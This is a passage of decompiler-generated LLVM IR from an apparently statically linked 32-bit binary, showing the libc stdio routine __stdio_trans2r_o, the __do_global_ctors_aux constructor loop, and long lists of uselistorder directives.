  uselistorder i32 16, { 98, 99, 100, 101, 102, 104, 103, 8, 105, 106, 33, 2, 107, 34, 108, 109, 110, 3, 111, 112, 113, 114, 115, 116, 117, 118, 125, 119, 120, 121, 122, 123, 124, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 168, 35, 36, 51, 37, 68, 46, 54, 91, 55, 172, 161, 10, 9, 162, 0, 11, 158, 159, 42, 173, 144, 145, 146, 147, 148, 149, 1, 150, 151, 152, 153, 154, 12, 155, 156, 47, 157, 169, 170, 171, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 50, 38, 69, 70, 71, 72, 75, 17, 14, 15, 16, 73, 74, 76, 79, 18, 19, 20, 77, 78, 80, 81, 82, 48, 83, 84, 5, 6, 85, 43, 86, 87, 88, 39, 41, 89, 44, 90, 49, 40, 52, 30, 31, 32, 28, 29, 26, 27, 21, 22, 23, 24, 25, 53, 92, 93, 7, 94, 95, 96, 97, 13, 45, 160, 4, 163, 164, 165, 166, 167 }
  uselistorder i32 12, { 91, 92, 93, 94, 95, 0, 96, 20, 29, 97, 98, 119, 24, 23, 5, 99, 6, 7, 8, 9, 10, 11, 12, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 152, 28, 30, 84, 90, 31, 32, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 25, 151, 115, 116, 117, 118, 153, 111, 1, 2, 112, 113, 13, 14, 114, 3, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 26, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 15, 16, 75, 76, 77, 21, 78, 79, 80, 81, 27, 22, 82, 83, 19, 18, 17, 85, 86, 87, 88, 89, 4 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8057ef4 = load i32, i32* @ebx, align 4
  %v4_8057ef8 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8057ef8, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8057f00 = bitcast i16* %arg1 to i32*
  %v2_8057f00 = load i32, i32* %v1_8057f00, align 4
  %v1_8057f02 = urem i32 %v2_8057f00, 65536
  %v2_8057f05 = and i32 %v1_8057f02, %arg2
  %v3_8057f05 = icmp eq i32 %v2_8057f05, 0
  %v1_8057f07 = icmp eq i1 %v3_8057f05, false
  br i1 %v1_8057f07, label %dec_label_pc_8057f16, label %dec_label_pc_8057f09

dec_label_pc_8057f09:                             ; preds = %entry
  %v1_8057f09 = and i32 %v2_8057f00, 2176
  %v2_8057f09 = icmp eq i32 %v1_8057f09, 0
  %v1_8057f0f = icmp eq i1 %v2_8057f09, false
  br i1 %v1_8057f0f, label %dec_label_pc_8057f1d, label %dec_label_pc_8057f11

dec_label_pc_8057f11:                             ; preds = %dec_label_pc_8057f09
  %v2_8057f11 = or i32 %v2_8057f00, %arg2
  %v1_8057f13 = trunc i32 %v2_8057f11 to i16
  store i16 %v1_8057f13, i16* %arg1, align 2
  %v0_8057f16.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057f16

dec_label_pc_8057f16:                             ; preds = %entry, %dec_label_pc_8057f11
  %v0_8057f38 = phi i32 [ %v4_8057ef8, %entry ], [ %v0_8057f16.pre, %dec_label_pc_8057f11 ]
  %v1_8057f16 = inttoptr i32 %v0_8057f38 to i16*
  %v2_8057f16 = load i16, i16* %v1_8057f16, align 2
  %v2_8057f19 = and i16 %v2_8057f16, 16
  %v3_8057f19 = icmp eq i16 %v2_8057f19, 0
  br i1 %v3_8057f19, label %dec_label_pc_8057f31, label %dec_label_pc_8057f1d

dec_label_pc_8057f1d:                             ; preds = %dec_label_pc_8057f16, %dec_label_pc_8057f09
  %v1_8057f1d = call i32 @__errno_location(i32 %v0_8057ef4)
  %v1_8057f22 = inttoptr i32 %v1_8057f1d to i32*
  store i32 9, i32* %v1_8057f22, align 4
  br label %dec_label_pc_8057f28

dec_label_pc_8057f28:                             ; preds = %dec_label_pc_8057f35, %dec_label_pc_8057f1d
  %v0_8057f28 = load i32, i32* @ebx, align 4
  %v1_8057f28 = inttoptr i32 %v0_8057f28 to i16*
  %v2_8057f28 = load i16, i16* %v1_8057f28, align 2
  %v3_8057f28 = or i16 %v2_8057f28, 8
  store i16 %v3_8057f28, i16* %v1_8057f28, align 2
  br label %dec_label_pc_8057f55

dec_label_pc_8057f31:                             ; preds = %dec_label_pc_8057f16
  %v2_8057f31 = and i16 %v2_8057f16, 64
  %v3_8057f31 = icmp eq i16 %v2_8057f31, 0
  br i1 %v3_8057f31, label %dec_label_pc_8057f4f, label %dec_label_pc_8057f35

dec_label_pc_8057f35:                             ; preds = %dec_label_pc_8057f31
  %v2_8057f39 = call i32 @__stdio_wcommit(i32 %v0_8057f38)
  %v1_8057f41 = icmp eq i32 %v2_8057f39, 0
  %v1_8057f43 = icmp eq i1 %v1_8057f41, false
  br i1 %v1_8057f43, label %dec_label_pc_8057f28, label %dec_label_pc_8057f45

dec_label_pc_8057f45:                             ; preds = %dec_label_pc_8057f35
  %v0_8057f45 = load i32, i32* @ebx, align 4
  %v1_8057f45 = inttoptr i32 %v0_8057f45 to i16*
  %v2_8057f45 = load i16, i16* %v1_8057f45, align 2
  %v3_8057f45 = and i16 %v2_8057f45, -65
  store i16 %v3_8057f45, i16* %v1_8057f45, align 2
  %v0_8057f49 = load i32, i32* @ebx, align 4
  %v1_8057f49 = add i32 %v0_8057f49, 8
  %v2_8057f49 = inttoptr i32 %v1_8057f49 to i32*
  %v3_8057f49 = load i32, i32* %v2_8057f49, align 4
  %v2_8057f4c = add i32 %v0_8057f49, 28
  %v3_8057f4c = inttoptr i32 %v2_8057f4c to i32*
  store i32 %v3_8057f49, i32* %v3_8057f4c, align 4
  %v0_8057f4f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057f4f

dec_label_pc_8057f4f:                             ; preds = %dec_label_pc_8057f31, %dec_label_pc_8057f45
  %v9_8057f4f = phi i32 [ %v0_8057f38, %dec_label_pc_8057f31 ], [ %v0_8057f4f.pre, %dec_label_pc_8057f45 ]
  %v1_8057f4f = inttoptr i32 %v9_8057f4f to i16*
  %v2_8057f4f = load i16, i16* %v1_8057f4f, align 2
  %v3_8057f4f = or i16 %v2_8057f4f, 1
  store i16 %v3_8057f4f, i16* %v1_8057f4f, align 2
  br label %dec_label_pc_8057f55

dec_label_pc_8057f55:                             ; preds = %dec_label_pc_8057f28, %dec_label_pc_8057f4f
  %storemerge = phi i32 [ 0, %dec_label_pc_8057f4f ], [ -1, %dec_label_pc_8057f28 ]
  store i32 %v0_8057ef4, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8057f00, { 1, 2, 0 }
  uselistorder i32 %v0_8057ef4, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 28, { 22, 23, 24, 17, 18, 25, 26, 27, 28, 45, 36, 29, 30, 2, 31, 32, 33, 34, 35, 4, 5, 6, 0, 37, 16, 38, 39, 40, 41, 42, 43, 1, 44, 46, 19, 20, 7, 8, 21, 13, 12, 10, 11, 14, 15, 9, 3 }
  uselistorder i32 8, { 130, 131, 132, 133, 135, 134, 136, 16, 17, 137, 138, 139, 140, 141, 142, 1, 143, 18, 10, 144, 145, 146, 147, 148, 149, 55, 150, 151, 57, 26, 27, 28, 29, 58, 30, 31, 32, 59, 33, 60, 34, 61, 62, 152, 153, 154, 155, 156, 157, 56, 158, 159, 160, 227, 228, 50, 234, 51, 235, 52, 75, 35, 77, 124, 129, 78, 79, 181, 182, 183, 184, 185, 186, 187, 2, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 3, 198, 199, 200, 201, 202, 64, 4, 65, 5, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 63, 220, 221, 6, 222, 223, 224, 225, 7, 226, 179, 180, 19, 233, 20, 21, 76, 161, 162, 163, 164, 166, 167, 168, 165, 169, 170, 171, 172, 36, 37, 173, 174, 175, 176, 177, 178, 22, 229, 230, 231, 232, 80, 81, 82, 83, 25, 66, 67, 84, 85, 0, 68, 86, 87, 23, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 69, 112, 38, 53, 39, 113, 114, 70, 14, 40, 54, 41, 115, 116, 71, 15, 117, 118, 119, 120, 11, 121, 12, 72, 74, 42, 73, 122, 123, 49, 48, 46, 47, 43, 44, 45, 13, 125, 126, 127, 128, 24, 9, 8 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i16 8, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 9, { 10, 11, 12, 13, 14, 6, 15, 16, 3, 8, 7, 17, 18, 19, 20, 5, 4, 0, 9, 2, 1 }
  uselistorder i32 (i32)* @__errno_location, { 48, 47, 46, 71, 70, 69, 45, 44, 43, 42, 41, 40, 27, 39, 38, 1, 32, 55, 26, 15, 14, 13, 12, 68, 11, 25, 24, 10, 23, 54, 53, 60, 59, 67, 66, 65, 22, 21, 52, 20, 35, 0, 37, 36, 2, 16, 51, 9, 8, 64, 34, 33, 63, 31, 3, 18, 4, 30, 17, 5, 50, 29, 28, 62, 61, 7, 6, 58, 57, 56, 72, 49, 19 }
  uselistorder i16 0, { 0, 7, 1, 8, 5, 6, 9, 11, 12, 13, 14, 10, 15, 16, 2, 3, 4 }
  uselistorder i32 65536, { 0, 1, 2, 4, 5, 3, 6, 83, 7, 8, 9, 10, 12, 11, 14, 13, 16, 15, 18, 17, 19, 20, 84, 86, 21, 22, 23, 28, 24, 29, 25, 30, 26, 31, 27, 35, 32, 36, 33, 37, 34, 38, 39, 41, 40, 43, 42, 44, 45, 49, 46, 50, 47, 51, 48, 52, 54, 53, 57, 55, 58, 56, 59, 60, 63, 61, 64, 62, 65, 66, 68, 67, 69, 70, 73, 74, 75, 71, 76, 72, 78, 77, 79, 81, 80, 82, 85 }
  uselistorder i32* @ecx, { 68, 27, 6, 8, 26, 7, 69, 70, 71, 72, 73, 74, 15, 75, 76, 77, 78, 16, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 37, 42, 38, 39, 40, 41, 95, 9, 10, 49, 0, 50, 96, 97, 98, 12, 19, 99, 100, 17, 11, 18, 101, 102, 103, 104, 105, 106, 176, 177, 178, 179, 13, 51, 1, 52, 107, 108, 31, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 28, 135, 136, 137, 138, 139, 140, 29, 141, 25, 233, 44, 45, 46, 47, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 20, 205, 180, 181, 182, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 21, 220, 221, 223, 224, 225, 222, 229, 168, 169, 170, 171, 172, 173, 174, 32, 33, 142, 143, 144, 145, 146, 147, 148, 30, 149, 14, 150, 151, 152, 153, 154, 22, 23, 2, 3, 155, 156, 24, 157, 158, 159, 160, 161, 163, 164, 165, 166, 35, 36, 162, 167, 227, 228, 230, 231, 232, 34, 43, 48, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 5, 64, 65, 66, 4, 67, 175, 226, 234 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8057f55, { 1, 0 }
  uselistorder label %dec_label_pc_8057f4f, { 1, 0 }
  uselistorder label %dec_label_pc_8057f16, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8057f6c = load i32, i32* @global_var_805d000.559, align 4096
  %v10_8057f71 = icmp eq i32 %v0_8057f6c, -1
  br i1 %v10_8057f71, label %dec_label_pc_8057f82, label %dec_label_pc_8057f76.preheader

dec_label_pc_8057f76.preheader:                   ; preds = %entry
  br label %dec_label_pc_8057f76

dec_label_pc_8057f76:                             ; preds = %dec_label_pc_8057f76.preheader, %dec_label_pc_8057f76
  %v4_8057f79 = phi i32 [ %v0_8057f6c, %dec_label_pc_8057f76.preheader ], [ %v2_8057f7b, %dec_label_pc_8057f76 ]
  %v0_8057f76 = phi i32 [ ptrtoint (i32* @global_var_805d000.559 to i32), %dec_label_pc_8057f76.preheader ], [ %v1_8057f76, %dec_label_pc_8057f76 ]
  %v1_8057f76 = add i32 %v0_8057f76, -4
  call void @__pseudo_call(i32 %v4_8057f79)
  %v1_8057f7b = inttoptr i32 %v1_8057f76 to i32*
  %v2_8057f7b = load i32, i32* %v1_8057f7b, align 4
  %v10_8057f7d = icmp eq i32 %v2_8057f7b, -1
  %v1_8057f80 = icmp eq i1 %v10_8057f7d, false
  br i1 %v1_8057f80, label %dec_label_pc_8057f76, label %dec_label_pc_8057f82.loopexit

dec_label_pc_8057f82.loopexit:                    ; preds = %dec_label_pc_8057f76
  %v2_8057f82.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8057f82

dec_label_pc_8057f82:                             ; preds = %dec_label_pc_8057f82.loopexit, %entry
  %v2_8057f82 = phi i32 [ %v2_8057f82.pre, %dec_label_pc_8057f82.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8057f82

; uselistorder directives
  uselistorder i32 %v0_8057f6c, { 1, 0 }
  uselistorder i1 false, { 942, 647, 648, 649, 650, 60, 651, 652, 653, 3, 0, 1, 5, 654, 656, 655, 4, 658, 657, 659, 660, 661, 662, 61, 7, 62, 670, 665, 669, 667, 668, 85, 663, 664, 666, 6, 671, 672, 673, 674, 145, 147, 148, 149, 150, 146, 151, 152, 153, 156, 154, 155, 675, 676, 681, 63, 677, 678, 680, 679, 682, 683, 688, 687, 684, 685, 686, 8, 9, 339, 340, 341, 86, 689, 690, 691, 694, 692, 693, 10, 64, 695, 697, 696, 87, 698, 700, 699, 88, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 889, 65, 12, 716, 717, 718, 719, 721, 720, 11, 722, 723, 66, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 871, 872, 874, 873, 13, 342, 343, 344, 345, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 104, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 943, 944, 81, 775, 89, 776, 777, 778, 890, 891, 892, 945, 959, 960, 961, 962, 963, 966, 90, 967, 968, 965, 958, 946, 123, 402, 403, 404, 405, 406, 407, 947, 948, 191, 192, 193, 194, 195, 196, 14, 408, 409, 82, 413, 15, 414, 415, 424, 157, 951, 952, 953, 954, 955, 956, 957, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 893, 906, 907, 908, 909, 910, 911, 912, 913, 57, 915, 914, 919, 916, 917, 918, 16, 920, 921, 410, 411, 879, 846, 847, 849, 850, 851, 964, 18, 418, 417, 17, 779, 780, 781, 91, 858, 859, 860, 861, 863, 862, 19, 864, 782, 20, 848, 865, 866, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 804, 803, 21, 805, 806, 807, 808, 809, 811, 58, 812, 810, 813, 815, 814, 22, 816, 817, 819, 818, 92, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 142, 143, 844, 845, 949, 93, 950, 23, 412, 882, 179, 160, 105, 158, 159, 94, 95, 161, 162, 163, 164, 165, 166, 167, 168, 169, 24, 25, 170, 171, 172, 173, 174, 175, 176, 177, 83, 178, 180, 96, 106, 107, 59, 108, 181, 182, 183, 184, 186, 185, 27, 26, 187, 188, 189, 190, 197, 198, 199, 200, 201, 202, 203, 204, 207, 109, 205, 206, 42, 43, 208, 103, 55, 67, 209, 210, 211, 102, 212, 213, 214, 215, 216, 217, 220, 110, 218, 219, 40, 41, 221, 68, 222, 223, 224, 225, 226, 227, 228, 231, 111, 229, 230, 38, 39, 232, 69, 233, 234, 235, 236, 237, 238, 239, 242, 112, 240, 241, 36, 37, 243, 70, 244, 245, 246, 247, 248, 249, 250, 253, 113, 251, 252, 34, 35, 254, 255, 256, 257, 258, 259, 261, 114, 260, 32, 33, 262, 71, 263, 264, 265, 266, 267, 268, 269, 270, 271, 274, 115, 272, 273, 30, 31, 275, 72, 276, 277, 278, 279, 280, 281, 282, 285, 116, 283, 284, 28, 29, 286, 73, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 117, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 346, 347, 348, 118, 369, 119, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 97, 98, 370, 371, 372, 373, 374, 375, 376, 377, 378, 56, 379, 120, 380, 381, 382, 121, 383, 384, 122, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 416, 419, 74, 420, 421, 422, 45, 423, 44, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 75, 633, 634, 635, 636, 637, 84, 638, 639, 640, 641, 642, 643, 644, 645, 646, 852, 853, 101, 854, 76, 855, 77, 856, 857, 46, 869, 867, 868, 47, 870, 48, 875, 876, 877, 49, 878, 2, 880, 881, 883, 884, 885, 78, 886, 887, 888, 922, 938, 923, 924, 925, 926, 931, 935, 936, 937, 50, 927, 99, 928, 929, 930, 79, 54, 932, 53, 80, 52, 933, 934, 51, 939, 940, 941, 144, 100, 969 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 11, 27, 54, 55, 56, 57, 63, 64, 65, 66, 9, 67, 2, 62, 68, 69, 70, 71, 72, 73, 12, 61, 59, 60, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 6, 5, 7, 3, 58, 0, 39, 10, 40, 41, 42, 43, 8, 14, 44, 45, 46, 1, 47, 48, 49, 50, 51, 13, 4, 52, 53 }
  uselistorder i32 ptrtoint (i32* @global_var_805d000.559 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 36, 37, 197, 91, 13, 198, 216, 92, 217, 93, 218, 350, 94, 95, 219, 96, 38, 23, 97, 27, 220, 221, 39, 40, 41, 100, 99, 98, 222, 156, 157, 22, 21, 20, 223, 224, 101, 225, 7, 351, 226, 352, 353, 227, 228, 354, 229, 24, 230, 231, 232, 102, 233, 355, 234, 235, 236, 103, 356, 237, 104, 238, 239, 240, 357, 43, 358, 44, 359, 360, 241, 181, 182, 183, 173, 175, 176, 177, 178, 179, 180, 174, 8, 172, 164, 242, 169, 170, 171, 184, 185, 168, 186, 187, 188, 189, 190, 191, 192, 165, 167, 42, 244, 243, 89, 9, 245, 246, 361, 362, 45, 18, 86, 247, 363, 248, 105, 106, 249, 107, 250, 199, 251, 108, 252, 253, 193, 110, 109, 254, 255, 256, 112, 111, 113, 257, 258, 14, 259, 260, 114, 115, 261, 116, 117, 262, 118, 263, 119, 264, 120, 265, 121, 266, 122, 267, 123, 268, 124, 269, 125, 270, 0, 46, 1, 271, 90, 126, 127, 272, 273, 274, 275, 276, 277, 129, 128, 200, 213, 2, 130, 278, 131, 279, 25, 280, 201, 281, 380, 282, 283, 47, 377, 378, 50, 49, 51, 52, 28, 53, 132, 54, 284, 48, 379, 10, 285, 286, 287, 202, 288, 55, 3, 368, 371, 133, 372, 364, 373, 289, 290, 291, 369, 370, 292, 374, 375, 19, 376, 381, 134, 15, 293, 16, 365, 366, 17, 294, 295, 367, 5, 56, 57, 4, 296, 214, 215, 297, 135, 298, 299, 11, 166, 136, 300, 137, 301, 87, 88, 302, 138, 303, 139, 304, 140, 305, 141, 306, 142, 307, 143, 308, 144, 309, 145, 310, 146, 311, 147, 312, 148, 313, 149, 314, 150, 315, 151, 316, 152, 317, 153, 318, 154, 319, 155, 320, 58, 321, 322, 204, 323, 205, 324, 203, 346, 347, 206, 59, 325, 60, 61, 62, 63, 29, 30, 31, 32, 33, 34, 35, 64, 326, 65, 327, 66, 328, 67, 329, 68, 330, 69, 331, 70, 332, 71, 72, 74, 73, 75, 333, 76, 77, 85, 78, 79, 26, 12, 80, 81, 207, 208, 349, 348, 334, 209, 335, 336, 337, 338, 82, 339, 195, 196, 194, 83, 158, 159, 160, 161, 162, 163, 84, 340, 341, 342, 343, 344, 345, 6, 210, 211, 212 }
  uselistorder i32 1, { 449, 81, 280, 450, 11, 888, 243, 775, 889, 237, 890, 83, 891, 281, 892, 893, 77, 894, 895, 332, 896, 432, 202, 452, 451, 78, 230, 282, 283, 897, 245, 898, 403, 899, 900, 901, 244, 902, 258, 433, 105, 104, 903, 904, 454, 453, 203, 905, 455, 906, 456, 204, 907, 908, 457, 205, 206, 809, 810, 811, 812, 813, 814, 815, 816, 817, 461, 460, 459, 434, 458, 435, 165, 164, 163, 166, 818, 819, 463, 462, 437, 436, 169, 171, 170, 172, 174, 173, 333, 909, 910, 231, 423, 911, 912, 284, 913, 365, 914, 915, 464, 50, 0, 1, 919, 916, 917, 918, 246, 465, 80, 79, 920, 466, 22, 852, 853, 854, 285, 855, 921, 922, 923, 467, 210, 209, 207, 211, 208, 367, 924, 925, 926, 927, 286, 23, 370, 371, 372, 928, 468, 373, 374, 929, 287, 2, 470, 469, 212, 375, 471, 182, 376, 226, 377, 930, 931, 932, 933, 934, 935, 936, 937, 277, 938, 475, 474, 473, 472, 46, 47, 288, 289, 25, 26, 24, 27, 334, 259, 477, 476, 161, 162, 378, 939, 940, 379, 380, 941, 479, 478, 480, 213, 481, 114, 381, 482, 232, 942, 943, 239, 944, 290, 247, 248, 945, 946, 238, 947, 948, 949, 950, 951, 291, 485, 484, 483, 952, 953, 954, 955, 956, 957, 958, 959, 236, 260, 960, 292, 961, 962, 963, 293, 964, 965, 294, 966, 967, 968, 969, 970, 382, 445, 487, 486, 117, 116, 118, 335, 336, 1042, 1043, 1044, 1045, 249, 856, 857, 858, 488, 158, 489, 971, 490, 48, 49, 366, 972, 973, 974, 295, 383, 975, 491, 976, 296, 977, 978, 503, 502, 501, 500, 499, 498, 497, 496, 495, 494, 493, 492, 214, 215, 216, 219, 220, 217, 221, 223, 218, 222, 979, 980, 3, 40, 39, 38, 37, 36, 504, 224, 225, 505, 34, 35, 981, 982, 506, 75, 74, 76, 1103, 1104, 1105, 13, 14, 12, 507, 983, 508, 140, 144, 145, 141, 143, 142, 984, 337, 511, 510, 509, 513, 512, 136, 514, 516, 515, 160, 518, 517, 112, 519, 183, 520, 184, 521, 185, 523, 522, 159, 525, 524, 176, 527, 526, 87, 529, 528, 58, 530, 534, 533, 532, 531, 135, 1108, 1109, 1110, 537, 536, 535, 42, 43, 41, 338, 539, 538, 541, 540, 186, 339, 413, 774, 261, 547, 546, 545, 544, 543, 542, 180, 181, 1106, 550, 549, 548, 90, 88, 89, 384, 551, 834, 835, 836, 406, 837, 552, 107, 108, 106, 109, 340, 341, 414, 275, 415, 416, 276, 417, 553, 554, 51, 52, 866, 233, 240, 867, 438, 555, 93, 95, 92, 94, 556, 100, 97, 96, 98, 102, 101, 99, 32, 29, 31, 33, 28, 30, 385, 558, 557, 386, 559, 387, 560, 388, 563, 562, 561, 418, 566, 565, 564, 187, 389, 1056, 1057, 1058, 567, 110, 1059, 1060, 250, 1061, 1062, 1063, 156, 154, 155, 419, 1055, 297, 188, 190, 189, 390, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 298, 1073, 1074, 1075, 1076, 1077, 344, 1078, 1079, 229, 345, 1080, 1081, 1082, 1083, 342, 343, 1084, 1085, 1086, 570, 569, 568, 64, 63, 62, 66, 65, 346, 347, 571, 348, 349, 299, 575, 574, 573, 572, 59, 300, 420, 576, 577, 578, 579, 580, 581, 582, 583, 1016, 262, 1017, 391, 278, 392, 1021, 263, 588, 587, 586, 585, 584, 85, 86, 589, 590, 1022, 1023, 591, 111, 594, 593, 592, 10, 595, 870, 871, 872, 985, 986, 446, 596, 129, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 987, 1018, 1019, 1020, 598, 597, 128, 127, 126, 1037, 1038, 600, 599, 125, 124, 123, 1039, 1112, 601, 20, 19, 21, 602, 603, 988, 989, 776, 302, 990, 991, 992, 993, 994, 996, 997, 998, 303, 999, 1000, 421, 301, 1001, 304, 1002, 1003, 1004, 995, 607, 606, 605, 604, 149, 151, 150, 146, 148, 147, 152, 1005, 608, 133, 130, 132, 131, 305, 609, 1006, 1007, 611, 610, 139, 138, 1008, 1009, 266, 265, 257, 1010, 350, 1011, 1012, 264, 1013, 306, 1014, 393, 1015, 613, 612, 15, 17, 16, 18, 307, 394, 4, 395, 614, 351, 615, 616, 61, 60, 1107, 618, 617, 191, 192, 352, 1111, 619, 193, 622, 621, 620, 623, 624, 626, 625, 103, 628, 627, 44, 629, 53, 630, 194, 632, 631, 122, 633, 45, 634, 69, 635, 57, 115, 637, 636, 84, 638, 167, 639, 119, 640, 195, 641, 196, 642, 644, 643, 134, 645, 91, 646, 137, 648, 647, 168, 649, 157, 650, 175, 113, 820, 251, 252, 405, 279, 821, 5, 6, 234, 404, 822, 777, 823, 824, 825, 826, 827, 828, 353, 308, 829, 267, 396, 422, 397, 658, 657, 447, 656, 655, 654, 653, 652, 651, 439, 177, 178, 179, 830, 831, 664, 663, 662, 661, 440, 660, 659, 424, 832, 833, 665, 778, 838, 839, 779, 309, 780, 310, 311, 781, 312, 313, 782, 314, 315, 783, 784, 316, 785, 317, 318, 786, 319, 320, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 670, 669, 668, 667, 666, 197, 198, 840, 841, 842, 843, 268, 844, 845, 846, 227, 678, 677, 676, 675, 674, 673, 672, 671, 70, 71, 847, 848, 269, 849, 850, 851, 228, 686, 685, 684, 683, 682, 681, 680, 679, 72, 73, 859, 797, 798, 241, 799, 800, 801, 242, 802, 354, 425, 860, 687, 692, 691, 690, 689, 688, 441, 54, 56, 55, 426, 427, 693, 861, 7, 428, 694, 862, 863, 699, 698, 697, 696, 695, 67, 68, 864, 702, 701, 700, 865, 429, 704, 703, 355, 430, 705, 708, 707, 706, 714, 713, 712, 711, 710, 709, 716, 715, 868, 804, 270, 805, 806, 807, 808, 869, 723, 722, 721, 720, 719, 718, 717, 120, 121, 235, 873, 874, 724, 321, 875, 876, 726, 725, 727, 407, 803, 728, 877, 729, 199, 200, 322, 731, 730, 271, 733, 732, 356, 324, 878, 363, 323, 364, 879, 880, 735, 734, 408, 881, 882, 398, 357, 358, 883, 737, 736, 884, 885, 738, 359, 399, 325, 886, 887, 744, 743, 742, 741, 740, 739, 368, 369, 1024, 1025, 272, 360, 1026, 326, 327, 1027, 1028, 747, 746, 745, 442, 201, 1029, 749, 748, 750, 256, 1040, 752, 751, 1041, 753, 409, 1046, 1047, 410, 1048, 1049, 411, 412, 1050, 1051, 754, 1052, 273, 1053, 361, 400, 758, 757, 756, 755, 401, 274, 328, 1054, 760, 759, 761, 8, 763, 762, 764, 1087, 1088, 1089, 1097, 1098, 255, 1099, 767, 766, 765, 153, 402, 9, 769, 768, 443, 329, 1090, 254, 1091, 1092, 330, 1093, 253, 1095, 1096, 331, 362, 431, 1094, 444, 1100, 1101, 770, 1102, 1113, 82, 772, 771, 773, 448 }
